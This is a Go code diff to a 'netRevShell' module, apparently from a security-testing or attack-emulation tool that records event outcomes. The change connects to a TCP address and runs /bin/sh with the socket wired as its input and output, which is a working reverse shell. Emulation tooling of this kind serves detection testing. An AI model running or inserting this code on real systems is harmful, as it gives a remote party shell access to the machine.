@@ -49,25 +49,41 @@ func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit m
 	var dialer net.Dialer
 	conn, err := dialer.DialContext(ctx, "tcp", address)
 	if err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
 		ev.Message = fmt.Sprintf("reverse shell attempt to %s (connection refused — no listener)", address)
 		emit(ev)
 		return nil
 	}
 	defer func() { _ = conn.Close() }()
+	// Pass the socket descriptor directly. Using net.Conn as an io.Reader
+	// starts an exec copy goroutine that can remain blocked on the peer even
+	// after the shell exits or is killed by cancellation.
+	socket, err := conn.(*net.TCPConn).File()
+	if err != nil {
+		emit(output.WithError(ev, err))
+		return err
+	}
+	defer func() { _ = socket.Close() }()
+	cmd := exec.CommandContext(ctx, "/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = socket, socket, socket
+	if err := cmd.Start(); err != nil {
+		emit(output.WithError(ev, err))
+		return err
+	}
 
 	ev.Success = true
 	ev.Message = fmt.Sprintf("reverse shell connected to %s, spawning /bin/sh", address)
 	ev = output.WithDetails(ev, map[string]any{"address": address, "shell": "/bin/sh"})
 	emit(ev)
 
-	cmd := exec.CommandContext(ctx, "/bin/sh")
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	_ = cmd.Run()
-
-	return nil
+	err = cmd.Wait()
+	if ctx.Err() != nil {
+		return ctx.Err()
+	}
+	return err
 }
 
 func (n *netRevShell) DryRun(params module.Params) []string {
